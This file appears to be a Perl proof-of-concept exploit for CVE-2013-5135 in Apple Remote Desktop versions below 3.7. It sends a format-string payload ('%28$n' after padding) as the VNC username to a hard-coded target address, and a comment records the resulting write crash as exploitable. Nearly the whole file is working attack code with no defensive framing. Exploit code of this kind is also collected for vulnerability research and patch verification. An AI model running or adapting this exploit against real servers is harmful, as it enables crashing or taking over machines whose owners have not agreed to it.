#!/usr/bin/perl
#
# For ARD (Apple Remote Desktop) authentication you must also specify a username. 
# You must also install Crypt::GCrypt::MPI and Crypt::Random
# CVE: CVE-2013-5135
# Credit: S2 Crew [Hungary] - PZ
# Software: Apple Remote Desktop
# Vulnerable version: < 3.7

use Net::VNC;

$target = "192.168.1.4";
$password = "B"x64;
$a = "A"x32;
$payload = $a."%28\$n"; # is_exploitable=yes:instruction_disassembly=mov    %ecx,(%rax):instruction_address=0x00007fff8e2a0321:access_type=write

print "Apple VNC Server @ $target\n";
print "Check the /var/log/secure.log file ;) \n";

$vnc = Net::VNC->new({hostname => $target, username => $payload, password => $password});
$vnc->login;
